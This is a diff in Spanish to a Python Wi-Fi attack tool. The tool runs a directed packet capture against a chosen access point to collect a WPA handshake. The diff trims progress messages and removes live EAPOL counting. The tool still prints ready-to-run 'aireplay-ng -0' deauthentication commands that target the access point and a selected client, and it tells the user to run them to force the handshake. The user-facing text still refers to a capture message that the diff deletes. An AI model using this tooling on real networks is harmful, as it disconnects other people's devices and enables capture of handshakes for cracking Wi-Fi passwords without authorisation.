@@ -193,14 +193,13 @@ def contar_eapol_provisional(ruta: Path, timeout: float = 4.0) -> int | None:
 
 def capturar_un_minuto(interfaz: str, bssid: str, canal: int,
                        duracion: int) -> tuple[Path, float]:
-    """Captura pasiva y muestra el progreso; análisis definitivo tras cerrar."""
+    """Captura durante 'duracion' segundos; el handshake se verifica al cerrar."""
     proceso = maestro = None
     inicio = time.monotonic()
     try:
         proceso, maestro = iniciar_captura_dirigida(interfaz, bssid, str(canal), PREFIJO)
         ruta = Path(ruta_captura(PREFIJO))
-        print(f"\n[INFO] Captura pasiva durante {duracion} segundos...")
-        print("[INFO] Los conteos EAPOL durante la captura son provisionales.")
+        print(f"\n[INFO] Capturando durante {duracion} segundos...")
         siguiente_aviso = 10
         while True:
             if proceso.poll() is not None:
@@ -209,13 +208,7 @@ def capturar_un_minuto(interfaz: str, bssid: str, canal: int,
             if transcurrido >= duracion:
                 break
             if transcurrido >= siguiente_aviso:
-                # Consulta breve: TShark nunca debe impedir el cierre de captura.
-                cantidad = contar_eapol_provisional(ruta)
-                if cantidad is None:
-                    estado = "EAPOL: sin lectura provisional"
-                else:
-                    estado = f"EAPOL observados: {cantidad} (provisional)"
-                print(f"[INFO] Capturando... {min(int(transcurrido), duracion)}/{duracion} s | {estado}")
+                print(f"[INFO] Capturando... {min(int(transcurrido), duracion)}/{duracion} s")
                 siguiente_aviso += 10
             time.sleep(min(0.5, max(0.05, duracion - transcurrido)))
         return ruta, time.monotonic() - inicio
@@ -224,10 +217,9 @@ def capturar_un_minuto(interfaz: str, bssid: str, canal: int,
         raise
     finally:
         if proceso is not None and maestro is not None:
-            print("[INFO] Finalizando proceso de captura...")
             with proteger_cierre():
                 detener_captura(proceso, maestro)
-            print("[OK] Proceso de captura cerrado.")
+            print("[OK] Captura finalizada.")
 
 
 def ejecutar_sesion(interfaz: str, duracion_escaneo: int = 30,
@@ -263,11 +255,11 @@ def ejecutar_sesion(interfaz: str, duracion_escaneo: int = 30,
         if estacion_seleccionada:
             print("\n[INFO] Cuando empiece la captura (verás 'Captura pasiva durante 60 segundos'),")
             print("[INFO] abre OTRA terminal y ejecuta este comando para forzar el handshake:")
-            print(f"sudo aireplay-ng -0 15 --ignore-negative-one -a {bssid} -c {estacion_seleccionada} {interfaz}")
+            print(f"sudo aireplay-ng -0 10 --ignore-negative-one -a {bssid} -c {estacion_seleccionada} {interfaz}")
         else:
             print("\n[INFO] Cuando empiece la captura (verás 'Captura pasiva durante 60 segundos'),")
             print("[INFO] abre OTRA terminal y ejecuta este comando para forzar el handshake:")
-            print(f"sudo aireplay-ng -0 15 --ignore-negative-one -a {bssid} {interfaz}")
+            print(f"sudo aireplay-ng -0 10 --ignore-negative-one -a {bssid} {interfaz}")
         
         print("[INFO] La captura comenzará enseguida y durará un minuto.")
 
